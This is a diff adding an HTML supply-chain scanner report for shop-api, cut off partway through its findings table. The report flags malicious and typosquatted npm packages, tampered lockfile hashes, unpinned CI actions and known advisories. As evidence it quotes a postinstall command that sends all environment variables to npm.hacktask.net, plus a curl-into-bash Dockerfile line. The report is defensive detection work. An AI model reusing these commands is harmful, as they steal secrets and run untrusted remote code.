@@ -1,0 +1,924 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>Guardian report — shop-api@1.4.0</title>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<style>
+body{font:14px/1.45 system-ui,-apple-system,Segoe UI,Roboto,sans-serif;margin:0;color:#1f2328;background:#f6f7f9}
+header{background:#0f2537;color:#fff;padding:18px 28px} header h1{margin:0;font-size:20px} header p{margin:4px 0 0;opacity:.8}
+main{padding:20px 28px;max-width:1300px} h2{font-size:16px;margin:26px 0 10px}
+.cards{display:flex;gap:10px;flex-wrap:wrap} .card{background:#fff;padding:10px 16px;border-radius:6px;min-width:90px;box-shadow:0 1px 2px #0001}
+.card .n{font-size:22px;font-weight:600} .grid3{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.grid3>div{background:#fff;padding:8px 14px;border-radius:6px} table{width:100%;border-collapse:collapse;background:#fff}
+td,th{padding:8px 10px;border-bottom:1px solid #e6e8eb;vertical-align:top;text-align:left}
+.sev{color:#fff;border-radius:4px;padding:2px 7px;font-size:12px;text-transform:uppercase} summary{cursor:pointer;font-weight:500}
+.meta{color:#57606a;font-size:12px} .src{color:#57606a;font-family:ui-monospace,monospace;font-size:12px}
+.filters{display:flex;gap:10px;margin:8px 0} select,input{padding:5px 8px;border:1px solid #ccd;border-radius:4px}
+ul{margin:4px 0 8px;padding-left:20px} small{color:#57606a}
+.svgwrap{background:#fff;border-radius:6px;padding:10px;overflow:auto;max-height:780px} .svgwrap svg{max-width:none}
+.tree{background:#fff;border-radius:6px;padding:10px 14px;font:13px/1.6 ui-monospace,Menlo,monospace;max-height:700px;overflow:auto}
+.tree ul{list-style:none;padding-left:18px;margin:0;border-left:1px dotted #ccd} .tree>ul{border:0;padding-left:0}
+.tw{display:inline-block;width:14px;cursor:pointer;color:#57606a} .tn.hit{background:#fff3a3}
+.dot{display:inline-block;width:8px;height:8px;border-radius:50%;margin:0 4px 1px 2px}
+.bdg{color:#fff;border-radius:3px;padding:0 5px;font-size:11px;margin-left:6px} .dev{color:#8b949e}
+</style></head><body>
+<header><h1>Software Supply Chain Guardian — Discover &amp; Detect</h1>
+<p>shop-api@1.4.0 · generated 2026-11-24T04:54:29Z · vulnerability data: registry.npmjs.org advisories (GitHub Advisory DB)</p></header>
+<main>
+<h2>What is in the application</h2>
+<div class="cards"><div class="card"><div class="n">157</div><div>components</div></div>
+<div class="card"><div class="n">14</div><div>direct</div></div>
+<div class="card"><div class="n">143</div><div>transitive</div></div>
+<div class="card"><div class="n">6</div><div>max depth</div></div>
+<div class="card"><div class="n">211</div><div>edges</div></div></div>
+<p><b>Ecosystems:</b> npm: 152, docker: 2, github-actions: 3<br><b>Scopes:</b> dev: 81, prod: 72, build: 1, ci: 3<br><b>Inputs:</b> package.json, package-lock.json, Dockerfile, .github/workflows/ci.yml</p>
+<h2>What changed (vs demo/baseline/package-lock.json)</h2><div class="grid3">
+<div><h3>Added (4)</h3><ul><li>flatmap-stream@0.1.1</li><li>crossenv@6.1.1</li><li>debug-helper-utils@1.0.2</li><li>ua-parser-js@0.7.29</li></ul></div>
+<div><h3>Removed (0)</h3><ul><li>none</li></ul></div>
+<div><h3>Version changed (1)</h3><ul><li>event-stream: 3.3.4 -&gt; 3.3.6</li></ul></div></div>
+<h2>What appears risky (75 findings)</h2>
+<div class="cards"><div class="card" style="border-top:4px solid #b3261e"><div class="n">10</div><div>critical</div></div><div class="card" style="border-top:4px solid #d9480f"><div class="n">31</div><div>high</div></div><div class="card" style="border-top:4px solid #c08b00"><div class="n">18</div><div>medium</div></div><div class="card" style="border-top:4px solid #3b6fb6"><div class="n">12</div><div>low</div></div><div class="card" style="border-top:4px solid #6b7280"><div class="n">4</div><div>info</div></div></div>
+<div class="filters"><select id="sev"><option value="">all severities</option>
+<option>critical</option><option>high</option><option>medium</option><option>low</option><option>info</option></select>
+<select id="cat"><option value="">all categories</option><option value="cicd">cicd (4)</option><option value="install-script">install-script (3)</option><option value="integrity">integrity (8)</option><option value="malicious-package">malicious-package (4)</option><option value="typosquat">typosquat (1)</option><option value="unexpected-dependency">unexpected-dependency (7)</option><option value="untrusted-image">untrusted-image (4)</option><option value="vulnerability">vulnerability (44)</option></select>
+<input id="q" placeholder="search…" size="30"><label><input type="checkbox" id="hideinfo" checked> hide info</label></div>
+<table><thead><tr><th>Severity</th><th>Category</th><th>Finding (click for evidence)</th><th>Component</th></tr></thead>
+<tbody><tr class="f" data-sev="critical" data-cat="install-script">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>install-script</td><td><details><summary>Suspicious install script in crossenv@6.1.1</summary>
+<p class="meta">GRD-d59b7c1df8 · rule INSTALL-SCRIPT · heuristic evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/crossenv]</span> hasInstallScript: true</li><li><b>script</b> <span class="src">[node_modules/crossenv/package.json]</span> postinstall: node -e &quot;require(&#x27;http&#x27;).request({host:&#x27;npm.hacktask.net&#x27;,path:&#x27;/log/?&#x27;+Buffer.from(JSON.stringify(process.env)).toString(&#x27;base64&#x27;)}).end()&quot;</li><li><b>pattern</b> <span class="src">[guardian rules]</span> executes inline / dynamically constructed code</li><li><b>pattern</b> <span class="src">[guardian rules]</span> decodes base64 payload</li><li><b>pattern</b> <span class="src">[guardian rules]</span> reads environment variables / secrets</li><li><b>pattern</b> <span class="src">[guardian rules]</span> reads environment/credentials AND sends data over the network (exfiltration pattern)</li></ul><p><b>Fix info:</b> install with --ignore-scripts and allowlist required builds; pin version</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="critical" data-cat="integrity">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>integrity</td><td><details><summary>Integrity hash changed for unchanged version lodash@4.17.15</summary>
+<p class="meta">GRD-704d795f51 · rule CHANGE-INTEGRITY · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> baseline integrity: sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE2QGoeQmb...</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/lodash]</span> current integrity: sha512-WJAEnrj+gB2oUrTvMs/hGDhnO9wWZDAUwbYwgNb3E...</li></ul><p><b>Fix info:</b> same version must always have the same bytes: treat as tampering, restore baseline lockfile</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="critical" data-cat="integrity">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>integrity</td><td><details><summary>Lockfile hash for lodash@4.17.15 does not match the registry</summary>
+<p class="meta">GRD-21c00fec6e · rule INTEGRITY-REGISTRY-MISMATCH · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; lodash@4.17.15</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/lodash]</span> integrity: sha512-WJAEnrj+gB2oUrTvMs/hGDhnO9wWZDAUw...</li><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> dist.integrity: sha512-8xOcRHvCjnocdS5cpwXQXVzmmh5e5+saE...</li></ul><p><b>Fix info:</b> treat as tampering: do not install; restore lockfile from trusted commit</p></details></td>
+<td>lodash@4.17.15<br><small>direct prod</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>Known malicious package in flatmap-stream@0.1.1: Malicious Package in flatmap-stream</summary>
+<p class="meta">GRD-613706260e · rule MAL-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-9x64-5r7x-2q53" target="_blank">GHSA-9x64-5r7x-2q53</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-9x64-5r7x-2q53: Malicious Package in flatmap-stream</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> installed flatmap-stream@0.1.1 is inside affected range =0.1.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> no fixed version published · introduced via: event-stream@3.3.6</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>Known malicious package in ua-parser-js@0.7.29: Embedded malware in ua-parser-js</summary>
+<p class="meta">GRD-98f61e9402 · rule MAL-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-pjwm-rvh2-c87w" target="_blank">GHSA-pjwm-rvh2-c87w</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-pjwm-rvh2-c87w: Embedded malware in ua-parser-js</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/ua-parser-js]</span> installed ua-parser-js@0.7.29 is inside affected range =0.7.29</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 8.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 0.7.30</p></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>crossenv was taken down by npm security (malicious package)</summary>
+<p class="meta">GRD-ae3966a225 · rule REGISTRY-SECURITY-HOLDER · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> npm replaced this package with a security holding placeholder (latest = 0.0.2-security); this happens when a package is removed for malicious code</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/crossenv]</span> installed version 6.1.1</li></ul><p><b>Fix info:</b> remove immediately; rotate any secrets present on machines that installed it</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="critical" data-cat="malicious-package">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>malicious-package</td><td><details><summary>flatmap-stream was taken down by npm security (malicious package)</summary>
+<p class="meta">GRD-ca39c1eed2 · rule REGISTRY-SECURITY-HOLDER · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> npm replaced this package with a security holding placeholder (latest = 0.0.1-security); this happens when a package is removed for malicious code</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> installed version 0.1.1</li></ul><p><b>Fix info:</b> remove immediately; rotate any secrets present on machines that installed it</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="vulnerability">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in event-stream@3.3.6: Critical severity vulnerability that affects event-stream and flatmap-stream</summary>
+<p class="meta">GRD-0ed05bf1fe · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mh6f-8j2x-4483" target="_blank">GHSA-mh6f-8j2x-4483</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mh6f-8j2x-4483: Critical severity vulnerability that affects event-stream and flatmap-stream</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/event-stream]</span> installed event-stream@3.3.6 is inside affected range =3.3.6</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.0.0 · introduced via: event-stream@3.3.6</p></details></td>
+<td>event-stream@3.3.6<br><small>direct prod</small></td></tr><tr class="f" data-sev="critical" data-cat="vulnerability">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in flatmap-stream@0.1.1: Critical severity vulnerability that affects event-stream and flatmap-stream</summary>
+<p class="meta">GRD-73005cb429 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-mh6f-8j2x-4483" target="_blank">GHSA-mh6f-8j2x-4483</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6 &rarr; flatmap-stream@0.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-mh6f-8j2x-4483: Critical severity vulnerability that affects event-stream and flatmap-stream</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/flatmap-stream]</span> installed flatmap-stream@0.1.1 is inside affected range &gt;=0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> no fixed version published · introduced via: event-stream@3.3.6</p></details></td>
+<td>flatmap-stream@0.1.1<br><small>transitive prod</small></td></tr><tr class="f" data-sev="critical" data-cat="vulnerability">
+<td><span class="sev" style="background:#b3261e">critical</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in minimist@1.2.5: Prototype Pollution in minimist</summary>
+<p class="meta">GRD-2dd08017e5 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-xvch-5gv4-984h" target="_blank">GHSA-xvch-5gv4-984h</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; minimist@1.2.5</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-xvch-5gv4-984h: Prototype Pollution in minimist</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/minimist]</span> installed minimist@1.2.5 is inside affected range &gt;=1.0.0 &lt;1.2.6</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</li></ul><p><b>Fix info:</b> fixed in: 1.2.6 · introduced via: minimist@1.2.5</p></details></td>
+<td>minimist@1.2.5<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="cicd">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>cicd</td><td><details><summary>GitHub Action quick-actions/npm-cache: branch/unversioned ref &#x27;main&#x27; (code changes on every run)</summary>
+<p class="meta">GRD-04410445f6 · rule CICD-UNPINNED-ACTION · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:.github/workflows/ci.yml:13]</span> uses: quick-actions/npm-cache@main</li></ul><p><b>Fix info:</b> pin to a full commit SHA: uses: quick-actions/npm-cache@&lt;40-char-sha&gt; # main</p></details></td>
+<td>quick-actions/npm-cache@main<br><small>direct ci</small></td></tr><tr class="f" data-sev="high" data-cat="cicd">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>cicd</td><td><details><summary>Untrusted event data interpolated into a workflow step</summary>
+<p class="meta">GRD-86639082f3 · rule CICD-SCRIPT-INJECTION · heuristic evidence · confidence medium
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>workflow-line</b> <span class="src">[.github/workflows/ci.yml:15]</span> - run: echo &quot;Triaging ${{ github.event.issue.title }}&quot;</li></ul><p><b>Fix info:</b> pass the value via env: and reference it as &quot;$VAR&quot;</p></details></td>
+<td>—<br><small> </small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>Download source for minimist@1.2.5 changed: registry.npmjs.org -&gt; registry.npmjs-cdn.com</summary>
+<p class="meta">GRD-cbacc02b07 · rule CHANGE-SOURCE · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; minimist@1.2.5</li></ul><p><b>Evidence:</b></p><ul><li><b>sbom-diff</b> <span class="src">[demo/baseline/package-lock.json]</span> baseline resolved: https://registry.npmjs.org/minimist/-/minimist-1.2.5.tgz</li><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/minimist]</span> current resolved: http://registry.npmjs-cdn.com/minimist/-/minimist-1.2.5.tgz</li></ul></details></td>
+<td>minimist@1.2.5<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>event-stream@3.3.6 is not published on the registry (unpublished or fabricated version)</summary>
+<p class="meta">GRD-0bb2f898bb · rule REGISTRY-VERSION-MISSING · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; event-stream@3.3.6</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> version 3.3.6 absent from packument</li></ul></details></td>
+<td>event-stream@3.3.6<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>minimist@1.2.5 is fetched over plain HTTP</summary>
+<p class="meta">GRD-dfc22d0f2f · rule INTEGRITY-INSECURE-URL · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; minimist@1.2.5</li></ul><p><b>Evidence:</b></p><ul><li><b>lockfile-entry</b> <span class="src">[package-lock.json:node_modules/minimist]</span> resolved: http://registry.npmjs-cdn.com/minimist/-/minimist-1.2.5.tgz</li></ul></details></td>
+<td>minimist@1.2.5<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="integrity">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>integrity</td><td><details><summary>ua-parser-js@0.7.29 is not published on the registry (unpublished or fabricated version)</summary>
+<p class="meta">GRD-d91accc1c1 · rule REGISTRY-VERSION-MISSING · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>registry</b> <span class="src">[registry.npmjs.org]</span> version 0.7.29 absent from packument</li></ul></details></td>
+<td>ua-parser-js@0.7.29<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="typosquat">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>typosquat</td><td><details><summary>Possible typosquat: &#x27;crossenv&#x27; looks like &#x27;cross-env&#x27;</summary>
+<p class="meta">GRD-d2c4aa3ad1 · rule TYPOSQUAT · heuristic evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; crossenv@6.1.1</li></ul><p><b>Evidence:</b></p><ul><li><b>name-similarity</b> <span class="src">[guardian popular-package list:node_modules/crossenv]</span> &#x27;crossenv&#x27; resembles popular package &#x27;cross-env&#x27; (same name after separator/homoglyph normalisation)</li><li><b>context</b> <span class="src">[inventory]</span> the legitimate &#x27;cross-env&#x27; is also in this dependency tree</li><li><b>install-script</b> <span class="src">[package-lock.json]</span> package runs an install-time script (hasInstallScript)</li><li><b>registry-metadata</b> <span class="src">[registry.npmjs.org]</span> npm replaced this package with a security holding placeholder (latest = 0.0.2-security); this happens when a package is removed for malicious code</li></ul><p><b>Fix info:</b> verify intent; if &#x27;cross-env&#x27; was meant, replace &#x27;crossenv&#x27; with &#x27;cross-env&#x27;</p></details></td>
+<td>crossenv@6.1.1<br><small>direct dev</small></td></tr><tr class="f" data-sev="high" data-cat="unexpected-dependency">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>unexpected-dependency</td><td><details><summary>Lockfile root declares &#x27;debug-helper-utils&#x27; which is not in package.json</summary>
+<p class="meta">GRD-46055a5e2c · rule UNEXPECTED-LOCK-ONLY-DEP · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; debug-helper-utils@1.0.2</li></ul><p><b>Evidence:</b></p><ul><li><b>manifest-diff</b> <span class="src">[package-lock.json:packages[&quot;&quot;]]</span> packages[&quot;&quot;] requires debug-helper-utils@1.0.2</li><li><b>manifest-diff</b> <span class="src">[package.json]</span> &#x27;debug-helper-utils&#x27; absent from all dependency sections</li></ul><p><b>Fix info:</b> lockfile was edited outside npm or is out of sync; regenerate and review the diff</p></details></td>
+<td>debug-helper-utils@1.0.2<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="untrusted-image">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>untrusted-image</td><td><details><summary>Dockerfile: RUN pipes a downloaded script into a shell</summary>
+<p class="meta">GRD-09f992c3b6 · rule IMAGE-PIPE-TO-SHELL · verified evidence · confidence high
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>dockerfile-line</b> <span class="src">[Dockerfile:4]</span> RUN curl -fsSL https://get.example-tools.io/setup.sh | bash</li></ul></details></td>
+<td>—<br><small> </small></td></tr><tr class="f" data-sev="high" data-cat="untrusted-image">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>untrusted-image</td><td><details><summary>Image &#x27;fastbuilds/node-runtime&#x27; comes from a non-allowlisted publisher (docker.io)</summary>
+<p class="meta">GRD-a0dfadd0ab · rule IMAGE-UNTRUSTED-SOURCE · verified evidence · confidence medium
+</p>
+<p><b>Dependency path(s):</b></p><ul><li>—</li></ul><p><b>Evidence:</b></p><ul><li><b>image-reference</b> <span class="src">[Dockerfile:Dockerfile:8]</span> image: fastbuilds/node-runtime:18</li><li><b>policy</b> <span class="src">[guardian policy]</span> not a Docker Official Image and not under trusted prefixes: gcr.io/distroless/, mcr.microsoft.com/, cgr.dev/chainguard/, registry.access.redhat.com/...</li></ul><p><b>Fix info:</b> use an official / verified-publisher image or add the publisher to the allowlist after review</p></details></td>
+<td>fastbuilds/node-runtime@18<br><small>direct prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in body-parser@1.19.0: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body</summary>
+<p class="meta">GRD-b38171a52f · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-27r3-jxmh-p828" target="_blank">GHSA-27r3-jxmh-p828</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-27r3-jxmh-p828: body-parser vulnerable to Denial of Service via trailing bytes after a compressed request body</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/body-parser]</span> installed body-parser@1.19.0 is inside affected range &lt;1.20.9</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 1.20.9 · introduced via: express@4.17.1</p></details></td>
+<td>body-parser@1.19.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in body-parser@1.19.0: body-parser vulnerable to denial of service when url encoding is enabled</summary>
+<p class="meta">GRD-7c9e777fa6 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-qwcr-r2fm-qrc7" target="_blank">GHSA-qwcr-r2fm-qrc7</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; express@4.17.1 &rarr; body-parser@1.19.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-qwcr-r2fm-qrc7: body-parser vulnerable to denial of service when url encoding is enabled</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/body-parser]</span> installed body-parser@1.19.0 is inside affected range &lt;1.20.3</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 1.20.3 · introduced via: express@4.17.1</p></details></td>
+<td>body-parser@1.19.0<br><small>transitive prod</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) — CVE-2026-59870 fix not backported</summary>
+<p class="meta">GRD-46855e70de · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-5p4m-2wfm-xmqj" target="_blank">GHSA-5p4m-2wfm-xmqj</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-5p4m-2wfm-xmqj: JS-YAML: Quadratic CPU consumption in !!omap resolution (3.x and 4.x) — CVE-2026-59870 fix not backported</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.3.1</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.3.1 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: js-yaml: YAML merge-key chains can force quadratic CPU consumption</summary>
+<p class="meta">GRD-e7a20cd82a · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-52cp-r559-cp3m" target="_blank">GHSA-52cp-r559-cp3m</a></p>
+<p><b>Dependency path(s):</b></p><ul><li>shop-api@1.4.0 &rarr; mocha@8.4.0 &rarr; js-yaml@4.0.0</li></ul><p><b>Evidence:</b></p><ul><li><b>advisory</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> GHSA-52cp-r559-cp3m: js-yaml: YAML merge-key chains can force quadratic CPU consumption</li><li><b>version-match</b> <span class="src">[package-lock.json:node_modules/js-yaml]</span> installed js-yaml@4.0.0 is inside affected range &gt;=4.0.0 &lt;4.3.0</li><li><b>cvss</b> <span class="src">[registry.npmjs.org advisories (GitHub Advisory DB)]</span> CVSS 7.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H)</li></ul><p><b>Fix info:</b> fixed in: 4.3.0 · introduced via: mocha@8.4.0</p></details></td>
+<td>js-yaml@4.0.0<br><small>transitive dev</small></td></tr><tr class="f" data-sev="high" data-cat="vulnerability">
+<td><span class="sev" style="background:#d9480f">high</span></td>
+<td>vulnerability</td><td><details><summary>Known vulnerability in js-yaml@4.0.0: js-yaml: maxTotalMergeKeys does not limit CPU use for empty merge sources</summary>
+<p class="meta">GRD-745c229a21 · rule VULN-KNOWN · verified evidence · confidence high
+ · <a href="https://github.com/advisories/GHSA-2883-xcg3-v3hh" target="_blank">GHSA-2883-xcg3-v3hh</a></p>
